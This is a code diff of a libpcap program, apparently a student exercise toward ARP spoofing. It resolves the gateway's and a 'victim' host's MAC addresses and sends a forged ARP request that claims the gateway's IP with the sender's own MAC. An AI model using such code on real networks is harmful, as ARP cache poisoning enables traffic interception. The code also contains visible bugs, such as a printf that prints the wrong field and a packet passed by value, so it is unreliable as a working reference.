@@ -35,7 +35,7 @@ void usage() {
 }
 
 
-const char* get_mac(char* eth_interface){
+const char* get_my_mac(char* eth_interface){
     char* addr = (char*)malloc(MAC_LEN * 3);
     struct ifreq s;
     int fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);
@@ -64,7 +64,7 @@ void get_gw_ip(char* gw_ip){
 }
 
 
-void get_gw_mac(pcap_t* pcap, char* mac){
+const char* get_mac(pcap_t* pcap, char* target_ip){
     struct pcap_pkthdr* header;
     const u_char* p;
 
@@ -76,9 +76,12 @@ void get_gw_mac(pcap_t* pcap, char* mac){
         struct ArpHdr* arp_hdr = (ArpHdr*)(p+sizeof(struct EthHdr));
 
 //        printf("type: %x, arp: %x\n", eth_hdr->type(), eth_hdr->Arp);
-        if(eth_hdr->type() != eth_hdr->Arp) continue;
+        if (eth_hdr->type() != eth_hdr->Arp) continue;
+        if (arp_hdr->op() != ArpHdr::Reply) continue;
+        printf("tip: %x\nsip: %x\n", arp_hdr->tip(), arp_hdr->tip());
+        if (arp_hdr->sip()!=htonl(Ip(target_ip))) continue;
 
-
+        char* mac = (char*)malloc(MAC_LEN*3);
         const uint8_t* mac_tmp = arp_hdr->smac().getMac();
 
         int size = sprintf(mac, "%02x:", mac_tmp[0]);
@@ -87,12 +90,13 @@ void get_gw_mac(pcap_t* pcap, char* mac){
                 size += sprintf(mac+size, "%02x:", mac_tmp[i]);
             }
             else{
-                sprintf(mac+size, "%02x", mac_tmp[i]);
+                sprintf(mac+size, "%02x\0", mac_tmp[i]);
             }
         }
-        break;
+        return mac;
     }
 }
+
 
 
 void arp_packet(EthArpPacket p, const char* s_mac, const char* v_dmac, const char* v_tmac, uint16_t op, const char* s_ip, const char* v_ip){
@@ -131,29 +135,36 @@ int main(int argc, char* argv[]) {
         return -1;
     }
 
-    const char* sender_mac = get_mac(dev);
-    const char gw_dmac[18] = "ff:ff:ff:ff:ff:ff";
-    const char gw_tmac[18] = "00:00:00:00:00:00";
+    const char* my_mac = get_my_mac(dev);
+    const char init_eth_dmac[18] = "ff:ff:ff:ff:ff:ff";
+    const char init_arp_tmac[18] = "00:00:00:00:00:00";
     char gw_ip[GW_IP_MAX_LEN];
     get_gw_ip(gw_ip);
 
     EthArpPacket packet;
 
-    arp_packet(packet, sender_mac, gw_dmac, gw_tmac, ArpHdr::Request, sender_ip, gw_ip);
-    int res_request = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
-    if (res_request != 0) {
-        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res_request, pcap_geterr(handle));
+    arp_packet(packet, my_mac, init_eth_dmac, init_arp_tmac, ArpHdr::Request, sender_ip, gw_ip);
+    int res_gw = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
+    if (res_gw != 0) {
+        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res_gw, pcap_geterr(handle));
     }
 
-    char gw_mac[MAC_LEN*3];
-    get_gw_mac(handle, gw_mac);
-    printf("%s\n", gw_mac);
+    const char* gw_mac = get_mac(handle, gw_ip);
+    printf("gw mac: %s\n", gw_mac);
 
+    arp_packet(packet, my_mac, init_eth_dmac, init_arp_tmac, ArpHdr::Request, gw_ip, victim_ip);
+    int res_victim = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
+    if (res_victim != 0) {
+        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res_victim, pcap_geterr(handle));
+    }
 
-//    arp_packet(packet, sender_mac, gw_dmac, gw_tmac, ArpHdr::Request, gw_ip, victim_ip); ///confused
+    const char* victim_mac = get_mac(handle, victim_ip);
+    printf("victim mac: %s\n", victim_mac);
 
 
     pcap_close(handle);
 
-    free((void*)sender_mac);
+    free((void*)my_mac);
+    free((void*)gw_mac);
+    free((void*)victim_mac);
 }
